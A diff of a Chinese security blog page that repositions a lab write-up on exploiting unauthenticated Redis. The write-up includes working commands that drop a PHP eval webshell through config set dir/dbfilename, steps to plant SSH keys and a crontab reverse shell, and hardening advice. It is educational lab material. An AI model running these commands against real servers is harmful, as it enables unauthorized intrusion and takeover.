@@ -159,6 +159,185 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's Blue SKY">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-03 16:32:38" itemprop="dateModified" datetime="2021-07-03T16:32:38+08:00">2021-07-03</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
+<ul>
+<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
+<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
+</ul>
+<p>漏洞可能产生的危害:</p>
+<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
+<p>下图为redis拿shell的三种方式及其条件：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
+<p>攻击机：kali 192.168.140.130</p>
+<p>kali一键安装redis，sudo apt install redis</p>
+<p>Ubuntu debian或其他环境安装指南：</p>
+<p>安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>
+
+<p>配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
+
+<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
+<p>为保证后面写入计划任务，此处以root权限启动redis</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
+<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
+<p>晓得绝对路径</p>
+<p>当然还要有写入权限</p>
+<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
+<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
+<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
+<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
+<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
+<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
+<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
+<blockquote>
+<p>shell的echo :</p>
+<p>用于字符串输出，其注意事项如下图所示：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
+</blockquote>
+<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
+<blockquote>
+<p>-x：read last argument from STDIN</p>
+<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
+<ul>
+<li><p>cat key.txt 输出 作为后面的输入</p>
+</li>
+<li><p>-x 读取标准输入</p>
+</li>
+<li><p>set crack 是将读取的输入作为crack此参数内容</p>
+<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
+</li>
+</ul>
+</blockquote>
+<p>找到靶机redis备份路径：</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
+<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
+<blockquote>
+<p>config:可查看或设置配置项</p>
+<p>dbfilename:备份文件</p>
+</blockquote>
+<p>SSH远程登陆成功</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
+<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
+<p>多见于CentOs使用</p>
+<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
+<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
+<blockquote>
+<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
+<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
+<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
+<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
+</blockquote>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
+<p>观察到此时并无反弹shell。但是确实写入成功。</p>
+<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
+<p>具体排查问题另起一篇博客说明。</p>
+<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
+<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
+<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
+<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/02/vulnHub-Lampiao/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -438,185 +617,6 @@
 <li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/">https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
 <li>Linux日志排查：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's Blue SKY">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-17 22:03:16" itemprop="dateModified" datetime="2021-06-17T22:03:16+08:00">2021-06-17</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>2.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
-<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
-<ul>
-<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
-<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
-</ul>
-<p>漏洞可能产生的危害:</p>
-<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
-<p>下图为redis拿shell的三种方式及其条件：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
-<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
-<p>攻击机：kali 192.168.140.130</p>
-<p>kali一键安装redis，sudo apt install redis</p>
-<p>Ubuntu debian或其他环境安装指南：</p>
-<p>安装：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>
-
-<p>配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>
-
-<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
-<p>为保证后面写入计划任务，此处以root权限启动redis</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
-<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
-<p>晓得绝对路径</p>
-<p>当然还要有写入权限</p>
-<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
-<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
-<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
-<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
-<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
-<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
-<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
-<blockquote>
-<p>shell的echo :</p>
-<p>用于字符串输出，其注意事项如下图所示：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
-</blockquote>
-<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
-<blockquote>
-<p>-x：read last argument from STDIN</p>
-<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
-<ul>
-<li><p>cat key.txt 输出 作为后面的输入</p>
-</li>
-<li><p>-x 读取标准输入</p>
-</li>
-<li><p>set crack 是将读取的输入作为crack此参数内容</p>
-<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
-</li>
-</ul>
-</blockquote>
-<p>找到靶机redis备份路径：</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
-<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
-<blockquote>
-<p>config:可查看或设置配置项</p>
-<p>dbfilename:备份文件</p>
-</blockquote>
-<p>SSH远程登陆成功</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
-<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
-<p>多见于CentOs使用</p>
-<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
-<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
-<blockquote>
-<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
-<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
-<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
-<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
-</blockquote>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
-<p>观察到此时并无反弹shell。但是确实写入成功。</p>
-<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
-<p>具体排查问题另起一篇博客说明。</p>
-<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
-<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
-<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
-<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
 </ol>
 
       
